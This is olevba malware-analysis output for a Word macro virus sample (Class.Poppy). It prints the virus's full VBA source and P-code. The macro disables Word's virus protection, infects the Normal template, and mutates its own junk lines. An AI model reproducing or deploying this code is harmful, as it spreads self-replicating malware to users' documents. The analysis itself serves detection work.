olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
P141oM = Gti9 + Aji82
On Error GoTo out
S153iI = Vgy10 + Uro118
Options.VirusProtection = False
K197tN = Out182 + Shn45
Options.SaveNormalPrompt = False
P20eF = Lxe20 + Ozn159
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
G32yG = Itf32 + Vrt129
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
J91qP = Hmv181 + Eny52
If nt > 40 And ad > 0 Then GoTo out
R138rG = Umm182 + Jxn166
If nt < 40 Then
A80oU = Jlo53 + Lps11
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
F125eB = Irp108 + Dpu31
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
U166lL = Ixi3 + Kjm42
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines (ad + 1), "' I infected " & Application.UserName & " on: " & Now
B16xH = Czo38 + Ooh135
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\" & Application.UserInitials
J92sD = Pfo98 + Bjr41
End If
H150xM = Dfx54 + Jtg134
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
F68yA = Hit8 + Fpu96
host.CodeModule.AddFromFile ("c:\" & Application.UserInitials)
E82gM = Qfs192 + Lym22
host.CodeModule.deletelines 1, 4
U69mH = Dpv109 + Vxz184
If nt < 40 Then host.CodeModule.replaceline 1, "Sub AutoClose()"
L82rS = Slk139 + Vsp35
With host.CodeModule
J136oR = Lqo177 + Fmp74
    For x = 2 To 48 Step 2
G38tD = Lvn136 + Hgp149
    .replaceline x, (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 200) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & Int(Rnd * 200)
N75iD = Rve92 + Byi23
    Next x
C150wB = Pon79 + Epj180
End With
Q160yN = Pzq139 + Ite83
out:
Q37tH = Jfx15 + Osx86
If nt > 40 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
V27oK = Vvr103 + Ito193
End Sub

' Class.Poppy.Gold Infection Log
' ------------------------------
' I infected DIRTY PC on: 10/30/98 12:25:22 PM
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.g
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4364 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld Gti9 
' 	Ld Aji82 
' 	Add 
' 	St P141oM 
' Line #2:
' 	OnError out 
' Line #3:
' 	Ld Vgy10 
' 	Ld Uro118 
' 	Add 
' 	St S153iI 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	Ld Out182 
' 	Ld Shn45 
' 	Add 
' 	St K197tN 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	Ld Lxe20 
' 	Ld Ozn159 
' 	Add 
' 	St P20eF 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #9:
' 	Ld Itf32 
' 	Ld Vrt129 
' 	Add 
' 	St G32yG 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #11:
' 	Ld Hmv181 
' 	Ld Eny52 
' 	Add 
' 	St J91qP 
' Line #12:
' 	Ld nt 
' 	LitDI2 0x0028 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #13:
' 	Ld Umm182 
' 	Ld Jxn166 
' 	Add 
' 	St R138rG 
' Line #14:
' 	Ld nt 
' 	LitDI2 0x0028 
' 	Lt 
' 	IfBlock 
' Line #15:
' 	Ld Jlo53 
' 	Ld Lps11 
' 	Add 
' 	St A80oU 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #17:
' 	Ld Irp108 
' 	Ld Dpu31 
' 	Add 
' 	St F125eB 
' Line #18:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #19:
' 	Ld Ixi3 
' 	Ld Kjm42 
' 	Add 
' 	St U166lL 
' Line #20:
' 	Ld ad 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x000D "' I infected "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0005 " on: "
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #21:
' 	Ld Czo38 
' 	Ld Ooh135 
' 	Add 
' 	St B16xH 
' Line #22:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	Ld Pfo98 
' 	Ld Bjr41 
' 	Add 
' 	St J92sD 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld Dfx54 
' 	Ld Jtg134 
' 	Add 
' 	St H150xM 
' Line #26:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #27:
' 	Ld Hit8 
' 	Ld Fpu96 
' 	Add 
' 	St F68yA 
' Line #28:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	Paren 
' 	Ld host 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #29:
' 	Ld Qfs192 
' 	Ld Lym22 
' 	Add 
' 	St E82gM 
' Line #30:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld host 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #31:
' 	Ld Dpv109 
' 	Ld Vxz184 
' 	Add 
' 	St U69mH 
' Line #32:
' 	Ld nt 
' 	LitDI2 0x0028 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld host 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #33:
' 	Ld Slk139 
' 	Ld Vsp35 
' 	Add 
' 	St L82rS 
' Line #34:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #35:
' 	Ld Lqo177 
' 	Ld Fmp74 
' 	Add 
' 	St J136oR 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0030 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #37:
' 	Ld Lvn136 
' 	Ld Hgp149 
' 	Add 
' 	St G38tD 
' Line #38:
' 	Ld x 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #39:
' 	Ld Rve92 
' 	Ld Byi23 
' 	Add 
' 	St N75iD 
' Line #40:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	Ld Pon79 
' 	Ld Epj180 
' 	Add 
' 	St C150wB 
' Line #42:
' 	EndWith 
' Line #43:
' 	Ld Pzq139 
' 	Ld Ite83 
' 	Add 
' 	St Q160yN 
' Line #44:
' 	Label out 
' Line #45:
' 	Ld Jfx15 
' 	Ld Osx86 
' 	Add 
' 	St Q37tH 
' Line #46:
' 	Ld nt 
' 	LitDI2 0x0028 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #47:
' 	Ld Vvr103 
' 	Ld Ito193 
' 	Add 
' 	St V27oK 
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	QuoteRem 0x0000 0x001F " Class.Poppy.Gold Infection Log"
' Line #51:
' 	QuoteRem 0x0000 0x001F " ------------------------------"
' Line #52:
' 	QuoteRem 0x0000 0x002D " I infected DIRTY PC on: 10/30/98 12:25:22 PM"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

